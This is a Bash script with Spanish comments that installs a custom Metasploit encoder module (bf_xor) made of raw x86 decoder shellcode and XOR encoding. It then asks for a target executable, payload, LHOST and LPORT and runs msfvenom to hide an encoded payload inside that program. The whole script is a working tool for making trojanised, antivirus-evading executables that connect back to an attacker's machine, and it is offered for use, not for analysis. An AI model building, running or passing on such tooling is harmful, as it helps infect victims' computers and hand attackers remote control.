#!/bin/bash
# Creador del Script: ZettaHack
# Codigo bf_xor original: https://github.com/Sogeti-Pentest/Encrypter-Metasploit.git
# Creador de earchivo bf_xor encoder para metasploit y generador de payload

function CrearArchivo {

cat > /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb <<- EOM
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Encoder

  def initialize
    super(
      'Name'             => 'bf_xor',
      'Description'      => '',
      'Author'           => 'François Profizi',
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE
      )
  end


  def decoder_stub(state)
    stub = ""
	
	stub << "\xEB\x62\x55\x8B\xEC\x83\xEC\x18\x8B\x7D\x10\x8B\x75\x0C\x33\xC0\x89\x45\xFC\x8B"
	stub << "\xC8\x83\xE1\x03\x03\xC9\x03\xC9\x03\xC9\x8B\xDA\xD3\xFB\x8A\xCB\x33\xDB\x39\x5D"
	stub << "\x14\x75\x18\x0F\xB6\x1E\x0F\xB6\xC9\x33\xD9\x8B\x4D\x08\x0F\xB6\x0C\x08\x3B\xD9"
	stub << "\x75\x07\xFF\x45\xFC\xEB\x02\x30\x0E\x40\x46\x3B\xC7\x7C\xC8\x3B\x7D\xFC\x74\x10"
	stub << "\x83\x7D\x14\x01\x74\x06\x42\x83\xFA\xFF\x72\xAF\x33\xC0\xEB\x02\x8B\xC2\xC9\xC3"
	stub << "\x55\x8B\xEC\x83\xEC\x10\xEB\x50\x58\x89\x45\xFC\xEB\x37\x58\x8B\x10\x89\x55\xF8"
	stub << "\x83\xC0\x04\x89\x45\xF4\x33\xDB\x33\xC0\x50\x6A\x0A\xFF\x75\xFC\xFF\x75\xF4\xE8"
	stub << "\x72\xFF\xFF\xFF\x85\xC0\x74\x13\x6A\x01\xFF\x75\xF8\xFF\x75\xFC\xFF\x75\xF4\xE8"
	stub << "\x5E\xFF\xFF\xFF\xFF\x65\xFC\xC9\xC3\xE8\xC4\xFF\xFF\xFF"
	
	stub << [state.buf.length].pack("L")  # size payload
    stub << state.buf[0,10]
	
	stub << "\xE8\xAB\xFF\xFF\xFF"
    return stub
  end

  def encode_block(state, block)
    key = rand(4294967295)
    encoded = ""
    key_tab = [key].pack('L<')
    i=0
    
    block.unpack('C*').each do |ch|
      octet = key_tab[i%4]
      t = ch.ord ^ octet.ord
      encoded += t.chr
      i+=1
    end
    return encoded
  end
end
EOM
echo "---------------------------------------------------------------------"
echo "-------------------¡ Archivo bf_xor.rb Creado !----------------------"
}

function CrearPayload {

echo "---------------------------------------------------------------------"
read -p " • Ruta del archivo objetivo: " objetivo
read -p " • Payload: " payload
read -p " • LHOST: " lhost
read -p " • LPORT: " lport
read -p " • Nombre final: " nombre_final
echo "---------------------------------------------------------------------"
msfvenom -p $payload LHOST=$lhost LPORT=$lport -f rar -x $objetivo -f exe-only -e x86/bf_xor -o $nombre_final
echo "--------------------------------------------------------------------"
echo "---------------------------¡ Completado !---------------------------"
echo "--------------------------------------------------------------------"

}

CrearArchivo
CrearPayload
